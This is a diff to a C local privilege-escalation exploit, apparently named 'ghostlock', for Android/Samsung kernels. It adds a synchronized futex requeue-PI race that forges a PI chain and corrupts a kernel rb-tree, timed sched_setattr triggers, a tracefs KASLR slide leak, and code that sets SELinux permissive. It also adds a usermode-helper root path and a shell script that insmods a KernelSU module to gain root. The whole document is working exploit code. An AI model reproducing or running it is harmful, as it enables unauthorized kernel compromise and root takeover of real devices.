@@ -133,6 +133,7 @@ atomic_int consumer_inflight;
 atomic_int main_route_delay_usec;
 atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
+_Atomic uint64_t gk_enter_ts;
 int memfd_leak;
 
 void *waiter_thread(void *arg __attribute__((unused))) {
@@ -147,7 +148,10 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
-  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
+  errno = 0;
+  long wait_ret =
+    futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
+  pr_info("waiter requeue_pi ret=%ld errno=%d\n", wait_ret, errno);
   do_pselect_fake_lock_route();
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
@@ -171,7 +175,22 @@ void *owner_thread(void *arg __attribute__((unused))) {
 
 void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
-  pin_to_core(CONSUMER_CORE);
+  int sync_route_enabled = active_offsets && active_offsets->sync_route;
+  int max_calls = (active_offsets && active_offsets->consumer_max_calls)
+                    ? active_offsets->consumer_max_calls
+                    : CONSUMER_MAX_CALLS;
+  int call_interval_usec = active_offsets
+    ? active_offsets->consumer_call_interval_usec : 0;
+  if (active_offsets && active_offsets->consumer_core) {
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(active_offsets->consumer_core, &cpuset);
+    if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
+      pin_to_core(CONSUMER_CORE);
+    }
+  } else {
+    pin_to_core(CONSUMER_CORE);
+  }
   int seen = 0;
   while (!atomic_load(&punch_consume_stop)) {
     int seq = atomic_load(&punch_consume_go);
@@ -181,11 +200,51 @@ void *consumer_thread(void *arg __attribute__((unused))) {
     }
     seen = seq;
     int tid = atomic_load(&waiter_tid);
+    if (sync_route_enabled) {
+      /* Use one precisely-timed fire: anchor at the pselect entry
+       * timestamp, sleep to ~1ms before the mark, busy-wait the last
+       * ~2ms.  Repeated firing on the corrupted rb tree risks a
+       * hardlockup, so exactly one punch per route. */
+      int delay_usec = atomic_load(&main_route_delay_usec);
+      uint64_t enter = 0;
+      while (!(enter = atomic_load(&gk_enter_ts))) {
+        if (atomic_load(&punch_consume_stop) ||
+            atomic_load(&punch_consume_go) != seq) break;
+        __asm__ volatile("yield" ::: "memory");
+      }
+      if (!enter) continue;
+      uint64_t target = enter + (uint64_t)delay_usec * 1000ULL;
+      for (;;) {
+        if (atomic_load(&punch_consume_stop) ||
+            atomic_load(&punch_consume_go) != seq) break;
+        uint64_t now = mono_ns();
+        if (now >= target) break;
+        uint64_t rem = target - now;
+        if (rem < 1999489ULL) {
+          __asm__ volatile("yield" ::: "memory");
+          continue;
+        }
+        usleep((useconds_t)((rem - 1000000ULL) / 1000ULL));
+      }
+      if (atomic_load(&punch_consume_stop) ||
+          atomic_load(&punch_consume_go) != seq) continue;
+      atomic_fetch_add(&consumer_calls, 1);
+      errno = 0;
+      long sched_ret =
+        sched_setattr_tid(tid, (atomic_load(&consumer_calls) % 19) + 1);
+      if (sched_ret == 0) {
+        atomic_fetch_add(&consumer_success, 1);
+      } else {
+        pr_info("sync punch sched_setattr failed errno=%d\n", errno);
+      }
+      atomic_store(&punch_consume_go, 0);
+      continue;
+    }
     int calls_this_seq = 0;
+    int delay_usec = atomic_load(&main_route_delay_usec);
+    if (delay_usec > 0) usleep((useconds_t)delay_usec);
     while (!atomic_load(&punch_consume_stop) &&
            atomic_load(&punch_consume_go) == seq) {
-      int delay_usec = atomic_load(&main_route_delay_usec);
-      if (delay_usec > 0) usleep((useconds_t)delay_usec);
       for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
         if (atomic_load(&punch_consume_stop) ||
             atomic_load(&punch_consume_go) != seq) break;
@@ -193,21 +252,29 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         atomic_store(&consumer_inflight, 1);
         errno = 0;
         long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
+        int sched_errno = errno;
         if (sched_ret != 0) {
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
+          errno = 0;
           long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
+          int futex_errno = errno;
           if (fret == 0) {
             futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
             sched_ret = 0;
+          } else if (calls_this_seq == 0) {
+            pr_info("consumer sched_setattr failed errno=%d; "
+                    "futex fallback failed errno=%d\n",
+                    sched_errno, futex_errno);
           }
         }
         if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
         atomic_store(&consumer_inflight, 0);
         calls_this_seq++;
-        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
+        if (calls_this_seq >= max_calls) {
           atomic_store(&punch_consume_go, 0);
           break;
         }
+        if (call_interval_usec) usleep((useconds_t)call_interval_usec);
       }
     }
   }
@@ -252,6 +319,306 @@ int run_main_route_threads(void) {
          atomic_load(&consumer_success) > 0 && cfi_last_step == 0;
 }
 
+/* ------------------------------------------------------------------ */
+/* EDEADLK-synchronized route (Samsung 6.1): three-thread handshake with a
+ * precisely timed sched_setattr operation.                            */
+/* ------------------------------------------------------------------ */
+
+atomic_int gk_pselect_entered, gk_route_done, gk_window_hit, gk_fire_success;
+static atomic_int gk_t3_ready, gk_t1_holds_a, gk_t2_positioned;
+static atomic_int gk_t1_about_wait, gk_t1_done, gk_t1_timeout;
+static atomic_int gk_edeadlk, gk_release, gk_owner_has_lock;
+static atomic_int gk_waiter_tid, gk_fire_count;
+
+static void *sync_waiter_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  atomic_store(&gk_waiter_tid, (int)syscall(SYS_gettid));
+  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
+    pr_error("sync waiter lock chain errno=%d\n", errno);
+  atomic_store(&gk_t1_holds_a, 1);
+  while (!atomic_load(&gk_t2_positioned)) usleep(1000);
+  atomic_store(&gk_t1_about_wait, 1);
+
+  /* FUTEX_WAIT_REQUEUE_PI takes an ABSOLUTE CLOCK_MONOTONIC timeout —
+   * The route uses now+50ms (including the 950ms normalization).
+   * A relative-looking {1,0} is 1s after boot: long expired, the waiter
+   * returns instantly and the requeue never sees it. */
+  struct timespec ts;
+  clock_gettime(CLOCK_MONOTONIC, &ts);
+  ts.tv_nsec += 50000000L;
+  if (ts.tv_nsec >= 950000000L) {
+    ts.tv_sec++;
+    ts.tv_nsec -= 950000000L;
+  }
+  errno = 0;
+  long r = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
+  int wait_errno = errno;
+  pr_info("sync waiter wait_requeue_pi ret=%ld errno=%d\n", r, wait_errno);
+  if (r == 0 || wait_errno != ETIMEDOUT) {
+    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    atomic_store(&gk_t1_done, 1);
+    return NULL;
+  }
+  atomic_store(&gk_t1_timeout, 1);
+  while (!atomic_load(&gk_edeadlk) && !atomic_load(&gk_release))
+    __asm__ volatile("yield" ::: "memory");
+  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  if (atomic_load(&gk_release)) {
+    atomic_store(&gk_t1_done, 1);
+    return NULL;
+  }
+  while (!atomic_load(&gk_owner_has_lock) && !atomic_load(&gk_release))
+    __asm__ volatile("yield" ::: "memory");
+  if (atomic_load(&gk_release)) {
+    atomic_store(&gk_t1_done, 1);
+    return NULL;
+  }
+  pr_info("sync waiter pselect begin owner=%d entered=%d route=%d\n",
+          atomic_load(&gk_owner_has_lock),
+          atomic_load(&gk_pselect_entered), atomic_load(&gk_route_done));
+  sync_pselect_phase();
+  pr_info("sync waiter pselect end route=%d hit=%d step=%d errno=%d\n",
+          atomic_load(&gk_route_done), atomic_load(&gk_window_hit),
+          cfi_last_step, cfi_last_errno);
+  atomic_store(&gk_t1_done, 1);
+  while (!atomic_load(&gk_release)) usleep(10000);
+  return NULL;
+}
+
+static void *sync_owner_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
+    pr_error("sync owner lock target errno=%d\n", errno);
+  while (!atomic_load(&gk_t1_holds_a)) usleep(1000);
+  atomic_store(&gk_t2_positioned, 1);
+  errno = 0;
+  long chain_ret = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  pr_info("sync owner chain lock ret=%ld errno=%d\n", chain_ret, errno);
+  atomic_store(&gk_owner_has_lock, 1);
+  while (!atomic_load(&gk_release)) usleep(1000);
+  return NULL; /* the owner remains held until the route is released */
+}
+
+static void *sync_consumer_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  /* Pin this pselect consumer to CPU2.  CPU1 changes the PI handoff timing
+   * enough to make the single sched_setattr operation intermittently reboot
+   * the device. */
+  int consumer_core = (active_offsets && active_offsets->consumer_core)
+                        ? active_offsets->consumer_core : 2;
+  cpu_set_t cpuset;
+  CPU_ZERO(&cpuset);
+  CPU_SET(consumer_core, &cpuset);
+  if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
+    pr_warning("sync consumer sched_setaffinity cpu=%d failed errno=%d\n",
+               consumer_core, errno);
+  }
+  atomic_store(&gk_t3_ready, 1);
+  int fire_once = 0;
+  for (;;) {
+    if (!(atomic_load(&gk_pselect_entered) && !fire_once)) {
+      if (atomic_load(&gk_route_done)) return NULL;
+      __asm__ volatile("yield" ::: "memory");
+      continue;
+    }
+    int delay_usec = atomic_load(&main_route_delay_usec);
+    uint64_t enter = 0;
+    while (!(enter = atomic_load(&gk_enter_ts))) {
+      if (atomic_load(&gk_route_done)) return NULL;
+      __asm__ volatile("yield" ::: "memory");
+    }
+    uint64_t target = enter + (uint64_t)delay_usec * 1000ULL;
+    /* Sleep to 1ms before the mark, then busy-wait the last ~2ms. */
+    for (;;) {
+      if (atomic_load(&gk_route_done)) return NULL;
+      uint64_t now = mono_ns();
+      if (now >= target) break;
+      uint64_t rem = target - now;
+      if (rem < 2000001ULL) {
+        __asm__ volatile("yield" ::: "memory");
+        continue;
+      }
+      usleep((useconds_t)((rem - 1000000ULL) / 1000ULL));
+    }
+    int n = atomic_fetch_add(&gk_fire_count, 1);
+    int tid = atomic_load(&gk_waiter_tid);
+    uint64_t punch_now = mono_ns();
+    int64_t punch_delta_ns = (int64_t)(punch_now - target);
+    pr_info("sync punch begin n=%d tid=%d now=%llu target=%llu "
+            "delta_ns=%lld delay_us=%d\n",
+            n, tid, (unsigned long long)punch_now,
+            (unsigned long long)target, (long long)punch_delta_ns, delay_usec);
+    errno = 0;
+    long r = sched_setattr_tid(tid, (n % 19) + 1);
+    int punch_errno = errno;
+    pr_info("sync punch end n=%d ret=%ld errno=%d fire=%d\n",
+            n, r, punch_errno, atomic_load(&gk_fire_success));
+    if (r != 0) {
+      pr_info("sync punch sched_setattr failed errno=%d\n", punch_errno);
+    } else {
+      atomic_fetch_add(&gk_fire_success, 1);
+    }
+    atomic_store(&gk_route_done, 1);
+    fire_once = 1;
+  }
+}
+
+static int sync_delay_override(void) {
+  const char *text = getenv("FOPS_DELAY_USEC");
+  if (text == NULL || text[0] == '\0') {
+    return -1;
+  }
+
+  char *end = NULL;
+  errno = 0;
+  long value = strtol(text, &end, 0);
+  if (errno != 0 || end == text || *end != '\0' || value < 0 ||
+      value > 1000000) {
+    pr_warning("sync invalid FOPS_DELAY_USEC=%s; using rotation\n", text);
+    return -1;
+  }
+  return (int)value;
+}
+
+static int sync_next_persistent_delay_index(int count) {
+  static const char state_path[] =
+      "/data/local/tmp/.ghostlock_fops_delay_index";
+  int state_fd = open(state_path, O_RDWR | O_CREAT | O_CLOEXEC, 0600);
+  if (state_fd < 0) {
+    return -1;
+  }
+
+  uint8_t stored = 0;
+  ssize_t read_len = pread(state_fd, &stored, sizeof(stored), 0);
+  int index = (read_len == (ssize_t)sizeof(stored) && stored < count)
+                  ? (int)stored
+                  : 0;
+  uint8_t next = (uint8_t)((index + 1) % count);
+  ssize_t write_len = pwrite(state_fd, &next, sizeof(next), 0);
+  int write_errno = errno;
+  errno = 0;
+  int sync_ret = fsync(state_fd);
+  int sync_errno = errno;
+  close(state_fd);
+  if (write_len != (ssize_t)sizeof(next)) {
+    pr_warning("sync delay index state write failed ret=%zd errno=%d\n",
+               write_len, write_errno);
+    return -1;
+  }
+  if (sync_ret != 0) {
+    pr_warning("sync delay index state fsync failed ret=%d errno=%d\n",
+               sync_ret, sync_errno);
+  }
+  return index;
+}
+
+int run_sync_route(void) {
+  reset_main_route_state();
+  atomic_store(&gk_pselect_entered, 0);
+  atomic_store(&gk_route_done, 0);
+  atomic_store(&gk_window_hit, 0);
+  atomic_store(&gk_fire_success, 0);
+  atomic_store(&gk_t3_ready, 0);
+  atomic_store(&gk_t1_holds_a, 0);
+  atomic_store(&gk_t2_positioned, 0);
+  atomic_store(&gk_t1_about_wait, 0);
+  atomic_store(&gk_t1_done, 0);
+  atomic_store(&gk_t1_timeout, 0);
+  atomic_store(&gk_edeadlk, 0);
+  atomic_store(&gk_release, 0);
+  atomic_store(&gk_owner_has_lock, 0);
+  atomic_store(&gk_waiter_tid, 0);
+  atomic_store(&gk_fire_count, 0);
+  atomic_store(&gk_enter_ts, 0);
+
+  /* Allow one delay to be selected externally while retaining the normal
+   * per-route rotation when the variable is absent. */
+  static const int fops_delays[] = {
+    70000, 60000, 80000, 40000, 90000, 50000,
+  };
+  int delay_count = (int)(sizeof(fops_delays) / sizeof(fops_delays[0]));
+  static int sync_route_counter;
+  int delay_override = sync_delay_override();
+  int delay_index = -1;
+  const char *delay_source = "rotation";
+  int route_delay = delay_override;
+  if (delay_override >= 0) {
+    delay_index = sync_route_counter++ % delay_count;
+    delay_source = "env";
+  } else {
+    delay_index = sync_next_persistent_delay_index(delay_count);
+    if (delay_index >= 0) {
+      delay_source = "persistent";
+    } else {
+      delay_index = sync_route_counter++ % delay_count;
+    }
+    route_delay = fops_delays[delay_index];
+  }
+  atomic_store(&main_route_delay_usec, route_delay);
+  pr_info("sync route delay=%dus source=%s index=%d\n", route_delay,
+          delay_source, delay_index);
+
+  pthread_t waiter, owner, consumer;
+  int waiter_rc = pthread_create(&waiter, NULL, sync_waiter_thread, NULL);
+  if (waiter_rc != 0)
+    pr_error("sync waiter thread create failed rc=%d\n", waiter_rc);
+  int owner_rc = pthread_create(&owner, NULL, sync_owner_thread, NULL);
+  if (owner_rc != 0)
+    pr_error("sync owner thread create failed rc=%d\n", owner_rc);
+  int consumer_rc = pthread_create(&consumer, NULL, sync_consumer_thread, NULL);
+  if (consumer_rc != 0)
+    pr_error("sync consumer thread create failed rc=%d\n", consumer_rc);
+
+  while (!atomic_load(&gk_t1_about_wait) || !atomic_load(&gk_t2_positioned) ||
+         !atomic_load(&gk_t3_ready)) {
+    usleep(1000);
+  }
+
+  int ok = 0;
+  long last_r = -2;
+  int last_errno = -2;
+  for (int i = 1000;;) {
+    errno = 0;
+    long r = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                      &f_pi_target, 0);
+    int requeue_errno = errno;
+    if (r != last_r || requeue_errno != last_errno) {
+      pr_info("sync requeue i=%d ret=%ld errno=%d\n", 1001 - i, r,
+              requeue_errno);
+      last_r = r;
+      last_errno = requeue_errno;
+    }
+    if (r > 0) break; /* plain wake = route not established */
+    if (r == 0) {     /* nobody queued yet */
+      if (i == 1) break;
+      usleep(1000);
+      i--;
+      continue;
+    }
+    if (requeue_errno != EDEADLK) break;
+    /* EDEADLK: the forged PI chain is live — let the waiter proceed. */
+    pr_info("sync route EDEADLK handoff waiter_done=%d owner_lock=%d\n",
+            atomic_load(&gk_t1_done), atomic_load(&gk_owner_has_lock));
+    atomic_store(&gk_edeadlk, 1);
+    while (!atomic_load(&gk_t1_done)) usleep(1000);
+    pr_info("sync route waiter done timeout=%d window=%d step=%d errno=%d\n",
+            atomic_load(&gk_t1_timeout), atomic_load(&gk_window_hit),
+            cfi_last_step, cfi_last_errno);
+    ok = atomic_load(&gk_t1_timeout) && atomic_load(&gk_window_hit) &&
+         cfi_last_step == 0;
+    break;
+  }
+  pr_info("sync route done ok=%d timeout_path=%d hit=%d step=%d\n",
+          ok, atomic_load(&gk_t1_timeout), atomic_load(&gk_window_hit),
+          cfi_last_step);
+  atomic_store(&gk_release, 1);
+  atomic_store(&gk_route_done, 1);
+  pthread_join(waiter, NULL);
+  pthread_join(owner, NULL);
+  pthread_join(consumer, NULL);
+  return ok;
+}
+
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
   /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
@@ -264,7 +631,8 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
   TIMER("  heap spray done");
-  int routed = run_main_route_threads();
+  int routed = active_offsets->sync_route ? run_sync_route()
+                                          : run_main_route_threads();
   TIMER("  PI route done");
   clear_pselect_write();
   if (!routed) {
@@ -343,6 +711,25 @@ static void slab_drain(void) {
 static char g_home_dir[256] = "/data/local/tmp";
 static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
 
+#define DEFAULT_LOCAL_ROOT_HELPER_PATH "/data/local/tmp/ghostlock-helper"
+#define LOCAL_ROOT_SOCKET "/data/local/tmp/temp_su.sock"
+
+const char *ghostlock_root_script_path(void) { return g_root_script_path; }
+
+static const char *local_root_helper_path(void) {
+  const char *from_app = getenv("GHOSTLOCK_HELPER_PATH");
+  if (from_app && from_app[0] && access(from_app, X_OK) == 0) {
+    return from_app;
+  }
+  if (access(DEFAULT_LOCAL_ROOT_HELPER_PATH, X_OK) == 0) {
+    return DEFAULT_LOCAL_ROOT_HELPER_PATH;
+  }
+  if (from_app && from_app[0]) {
+    return from_app;
+  }
+  return DEFAULT_LOCAL_ROOT_HELPER_PATH;
+}
+
 static void init_runtime_paths(void) {
   const char *home = getenv("GHOSTLOCK_HOME");
   if (!home || !home[0]) home = getenv("TMPDIR");
@@ -372,39 +759,34 @@ static void write_root_script(void) {
       "#!/system/bin/sh\n"
       "HOME_DIR='%s'\n"
       "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
-      "KSUD=\"$HOME_DIR/ksud\"\n"
+      "LOADER=\"/data/local/tmp/lkmloader.ko\"\n"
+      "MODULE=\"/data/local/tmp/kernelsu.ko\"\n"
       "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
       "chmod 644 \"$LOG\" 2>/dev/null\n"
       "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
-      "if [ ! -x \"$KSUD\" ]; then\n"
-      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-      "fi\n"
-      "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
-      "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
-      "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
-      "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
       "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
-      "if [ ! -x \"$KSUD\" ]; then\n"
-      "  echo '[!] ksud missing' | tee -a \"$LOG\"\n"
+      "echo \"[*] selinux_context=$(cat /proc/self/attr/current 2>/dev/null)\" >>\"$LOG\"\n"
+      "echo \"[*] direct loader=$LOADER module=$MODULE\" >>\"$LOG\"\n"
+      "echo \"[*] direct loader_file=$(ls -l \"$LOADER\" 2>/dev/null)\" >>\"$LOG\"\n"
+      "echo \"[*] direct module_file=$(ls -l \"$MODULE\" 2>/dev/null)\" >>\"$LOG\"\n"
+      "if [ ! -r \"$LOADER\" ] || [ ! -r \"$MODULE\" ]; then\n"
+      "  echo '[!] direct loader or kernelsu module missing' | tee -a \"$LOG\"\n"
       "  exit 1\n"
       "fi\n"
-      "chmod 755 \"$KSUD\" 2>/dev/null\n"
-      "if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
-      "  KVER=$(uname -r | cut -d. -f1-2)\n"
-      "  AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
-      "  KMI=\"${AVER}-${KVER}\"\n"
-      "  if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then KMI=android15-6.6; fi\n"
-      "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
-      "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
-      "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
+      "if ! cd /data/local/tmp; then\n"
+      "  echo '[!] direct loader chdir failed' | tee -a \"$LOG\"\n"
+      "  exit 1\n"
       "fi\n"
-      "KSU_READY=0\n"
-      "for i in $(seq 1 50); do\n"
-      "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
-      "  sleep 0.1\n"
-      "done\n"
-      "if [ \"$KSU_READY\" -ne 1 ]; then\n"
-      "  echo '[!] KernelSU module not loaded; SELinux policy/enforcing unchanged' | tee -a \"$LOG\"\n"
+      "echo \"[*] direct insmod begin cwd=$(pwd)\" >>\"$LOG\"\n"
+      "/system/bin/insmod lkmloader.ko module_path=kernelsu.ko >>\"$LOG\" 2>&1\n"
+      "INSMOD_RC=$?\n"
+      "echo \"[*] direct insmod exit=$INSMOD_RC\" >>\"$LOG\"\n"
+      "if [ \"$INSMOD_RC\" -ne 0 ]; then\n"
+      "  echo '[!] direct lkmloader insmod failed' | tee -a \"$LOG\"\n"
+      "  exit 1\n"
+      "fi\n"
+      "if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+      "  echo '[!] KernelSU module not visible after direct insmod' | tee -a \"$LOG\"\n"
       "  exit 1\n"
       "fi\n"
       "echo '[+] KernelSU module loaded' | tee -a \"$LOG\"\n"
@@ -444,6 +826,53 @@ static int kernelsu_module_loaded(void) {
   }
   fclose(modules);
   return loaded;
+}
+
+/* The external late-load helper cannot be used as a standalone client: its
+ * --late-load mode verifies a ticket/payload environment first.  Ghostlock
+ * keeps only the root UMH daemon and local Unix-socket boundary, with both
+ * ends implemented locally. */
+static int run_local_late_load(void) {
+  const char *helper_path = local_root_helper_path();
+  pid_t child = fork();
+  if (child < 0) {
+    pr_warning("local late-load client fork failed errno=%d\n", errno);
+    return 0;
+  }
+  if (child == 0) {
+    prctl(PR_SET_NAME, "ghostlock-ksu-client");
+    execl(helper_path, "ghostlock-helper", "--late-load", NULL);
+    _exit(127);
+  }
+
+  int status = 0;
+  int waited_ms = 0;
+  for (;;) {
+    pid_t waited = waitpid(child, &status, WNOHANG);
+    if (waited == child) break;
+    if (waited < 0) {
+      pr_warning("local late-load client wait failed errno=%d\n", errno);
+      return 0;
+    }
+    if (waited_ms >= 60000) {
+      pr_warning("local late-load client timed out; killing pid=%d\n", child);
+      kill(child, SIGKILL);
+      waitpid(child, &status, 0);
+      return 0;
+    }
+    usleep(100000);
+    waited_ms += 100;
+  }
+
+  if (WIFEXITED(status)) {
+    int rc = WEXITSTATUS(status);
+    pr_info("local late-load client exit=%d\n", rc);
+    return rc == 0;
+  }
+  if (WIFSIGNALED(status)) {
+    pr_warning("local late-load client signal=%d\n", WTERMSIG(status));
+  }
+  return 0;
 }
 
 /* Find a task through perf sample records. */
@@ -789,13 +1218,13 @@ static int verify_leaf_dir_stage(void *context) {
 }
 
 int run_exploit(int argc, char **argv) {
-  (void)argc; (void)argv;
+  (void)argc;
+  (void)argv;
   disable_rseq_for_thread();
   set_unbuffer();
   signal(SIGPIPE, SIG_IGN);
   set_limit();
   init_runtime_paths();
-  write_root_script();
 
   if (!active_offsets && select_offsets() < 0) return 1;
 
@@ -807,14 +1236,38 @@ int run_exploit(int argc, char **argv) {
   kaslr_slide = 0;
   kaslr_base = KIMAGE_TEXT_BASE;
   kaslr_done = 1;
+  if (active_offsets->tracefs_leak) {
+    /* Samsung devices randomize the kernel slide every boot (physical and
+     * virtual offsets are equal on arm64).  Discover it before any write:
+     * with a wrong slide every physmap-derived target is off by up to
+     * 0x1f0000 and the write corrupts random kernel memory. */
+    uint64_t leaked_base = 0;
+    if (!tracefs_leak_kernel_base(&leaked_base)) {
+      pr_error("tracefs slide leak failed; aborting instead of writing "
+               "with a guessed slide\n");
+      return 1;
+    }
+    kaslr_base = leaked_base;
+    kaslr_slide = leaked_base - KIMAGE_TEXT_BASE;
+    p0_kernel_phys_load += kaslr_slide;
+    pr_success("tracefs leak base=%016llx slide=%016llx phys_load=%016llx\n",
+               (unsigned long long)kaslr_base,
+               (unsigned long long)kaslr_slide,
+               (unsigned long long)p0_kernel_phys_load);
+  }
 
   timer_reset();
   TIMER("exploit start");
 
   /* W1: disable SELinux before task discovery. untrusted_app may not be able
-   * to read enforce while it is still enforcing, so attempt W1 regardless. */
+   * to read enforce while it is still enforcing, so attempt W1 regardless.
+   * UMH-root devices write permissive inside the UMH staging instead, right
+   * before queueing the work item (shortest permissive window,
+   * no separate W1 route cycle). */
   int selinux_ok = check_selinux_off();
-  if (!selinux_ok) {
+  if (active_offsets->umh_root) {
+    pr_info("UMH device: SELinux permissive deferred to the UMH stage\n");
+  } else if (!selinux_ok) {
     if (!enforce_readable()) {
       pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
     }
@@ -829,6 +1282,48 @@ int run_exploit(int argc, char **argv) {
     TIMER("Write 1 complete");
   } else {
     pr_success("SELinux already permissive\n");
+  }
+
+  if (active_offsets->umh_root) {
+    /* KDP_CRED devices: never rewrite creds.  Run the route once without a
+     * custom write; try_cfi_stage() swaps ashmem fops and gains the
+     * configfs arbitrary write, then install_android_root() ->
+     * install_workqueue_umh_root() writes SELinux permissive and queues
+     * the dedicated local helper as the kernel-spawned process. */
+    int umh_ok = 0;
+    for (int attempt = 1; attempt <= 6 && !umh_ok; attempt++) {
+      pr_info("UMH bootstrap attempt %d/6\n", attempt);
+      slab_drain();
+      umh_ok = do_one_write(0, "UMH bootstrap", 0, 0);
+      if (!umh_ok) {
+        pr_warning("UMH bootstrap attempt %d failed; backing off\n", attempt);
+        usleep(100000);
+      }
+    }
+    if (!umh_ok) {
+      pr_warning("UMH root staging failed\n");
+      return 1;
+    }
+    TIMER("UMH work queued");
+
+    /* The dedicated local helper stays resident after --umh and accepts the
+     * late-load request from the original shell UID over the local socket. */
+    errno = 0;
+    const char *helper_path = local_root_helper_path();
+    int helper_access = access(helper_path, X_OK);
+    int helper_access_errno = helper_access < 0 ? errno : 0;
+    pr_info("local late-load helper=%s access=%d errno=%d socket=%s\n",
+            helper_path, helper_access, helper_access_errno,
+            LOCAL_ROOT_SOCKET);
+    int ksu_ready = run_local_late_load();
+    if (ksu_ready) {
+      pr_success("KernelSU ready via local UMH helper\n");
+    } else {
+      pr_warning("local UMH helper late-load failed; see %s\n",
+                 LOCAL_ROOT_SOCKET);
+    }
+    TIMER("exploit complete");
+    return ksu_ready ? 0 : 1;
   }
 
   /* W2: overwrite the child credential via the task leaked by perf. */
@@ -1048,4 +1543,12 @@ int run_exploit(int argc, char **argv) {
   return 0;
 }
 
-int main(int argc, char **argv) { return run_exploit(argc, argv); }
+int main(int argc, char **argv) {
+  if (argc >= 2 && strcmp(argv[1], "--umh") == 0) {
+    return ghostlock_umh_entry(argc, argv);
+  }
+  if (argc == 2 && strcmp(argv[1], "--late-load") == 0) {
+    return ghostlock_late_load_client();
+  }
+  return run_exploit(argc, argv);
+}
